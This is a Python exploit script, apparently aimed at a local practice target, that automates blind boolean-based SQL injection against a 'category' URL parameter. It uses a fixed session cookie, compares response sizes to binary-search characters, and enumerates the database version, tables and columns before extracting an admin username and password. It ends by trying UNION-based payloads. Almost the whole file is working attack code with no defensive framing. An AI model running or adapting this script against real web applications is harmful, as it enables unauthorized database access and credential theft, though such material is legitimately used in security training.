import requests
import urllib.parse
import time

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] SQL Injection Exploitation - Improved Version")
print(f"[+] Target: {target}")

# Get baseline measurements
def get_baselines():
    r1 = session.get(target + "?category=Nature")
    size1 = len(r1.text)
    
    # Test TRUE condition multiple times
    true_payload = "Nature' AND '1'='1"
    rt1 = session.get(target + "?category=" + urllib.parse.quote(true_payload))
    rt2 = session.get(target + "?category=" + urllib.parse.quote(true_payload))
    
    # Test FALSE condition multiple times  
    false_payload = "Nature' AND '1'='2"
    rf1 = session.get(target + "?category=" + urllib.parse.quote(false_payload))
    rf2 = session.get(target + "?category=" + urllib.parse.quote(false_payload))
    
    true_avg = (len(rt1.text) + len(rt2.text)) / 2
    false_avg = (len(rf1.text) + len(rf2.text)) / 2
    
    print(f"[+] Baseline sizes - Normal: {size1}, True: {true_avg:.1f}, False: {false_avg:.1f}")
    return true_avg, false_avg

true_avg, false_avg = get_baselines()

def test_condition(query):
    """Test SQL query and return True if condition is met"""
    r = session.get(target + "?category=" + urllib.parse.quote(query))
    response_size = len(r.text)
    # Compare which baseline it's closer to
    return abs(response_size - true_avg) < abs(response_size - false_avg)

def extract_data(query, max_len=100):
    """Extract data using blind SQL injection"""
    result = ""
    print(f"[+] Extracting with query: {query[:60]}")
    
    for pos in range(1, max_len + 1):
        # Binary search for character
        low, high = 32, 126
        char = None
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test: Is character at pos >= mid?
            test_query = f"Nature' AND ASCII(SUBSTRING(({query}),{pos},1))>={mid}--"
            if test_condition(test_query):
                # Character is >= mid
                low = mid + 1
            else:
                # Character is < mid
                high = mid - 1
        
        # Now test the exact value
        final_char = high
        test_query = f"Nature' AND ASCII(SUBSTRING(({query}),{pos},1))={final_char}--"
        if test_condition(test_query):
            char = chr(final_char)
            result += char
            print(f"[+] Position {pos}: '{char}'")
        else:
            # No character found - end of data
            print(f"[+] End at position {pos-1}")
            break
    
    return result

# Main exploitation
print("\n[+] Phase 1: Database Information")
db_version = extract_data("SELECT version()", 50)
print(f"[+] DB Version: '{db_version}'")

db_name = extract_data("SELECT database()", 30)
print(f"[+] DB Name: '{db_name}'")

print("\n[+] Phase 2: Finding Tables")
tables = []
for i in range(10):
    table = extract_data(f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1", 40)
    if table:
        tables.append(table)
        print(f"[+] Table {i}: '{table}'")
    else:
        break

# Find admin table
admin_table = None
for table in tables:
    if 'admin' in table.lower():
        admin_table = table
        break

if admin_table:
    print(f"\n[+] Phase 3: Columns in {admin_table}")
    columns = []
    for i in range(10):
        col = extract_data(f"SELECT column_name FROM information_schema.columns WHERE table_name='{admin_table}' LIMIT {i},1", 30)
        if col:
            columns.append(col)
            print(f"[+] Column {i}: '{col}'")
        else:
            break
    
    # Find username/password columns
    user_col = None
    pass_col = None
    for col in columns:
        if 'user' in col.lower() and not user_col:
            user_col = col
        elif 'pass' in col.lower() and not pass_col:
            pass_col = col
    
    if user_col and pass_col:
        print(f"\n[+] Phase 4: Extracting Credentials")
        username = extract_data(f"SELECT {user_col} FROM {admin_table} LIMIT 1", 50)
        password = extract_data(f"SELECT {pass_col} FROM {admin_table} LIMIT 1", 50)
        
        print(f"\n[!] CREDENTIALS FOUND:")
        print(f"[!] Username: {username}")
        print(f"[!] Password: {password}")

# Try UNION alternative approach
print("\n[+] Phase 5: UNION-based Attempts")
union_tests = [
    "' UNION SELECT 1,2,3,4,5",
    "' UNION SELECT version(),database(),user()",
    "' UNION SELECT table_name,null,null,null,null FROM information_schema.tables WHERE table_schema=database()"
]

for test in union_tests:
    r = session.get(target + "?category=" + urllib.parse.quote(test))
    size = len(r.text)
    print(f"[+] Test: {test[:50]} | Size: {size}")
    if size > (true_avg + false_avg) / 2 + 100:
        print(f"[!] Different response!\n{r.text[:500]}")

print("\n[+] Exploitation Complete")
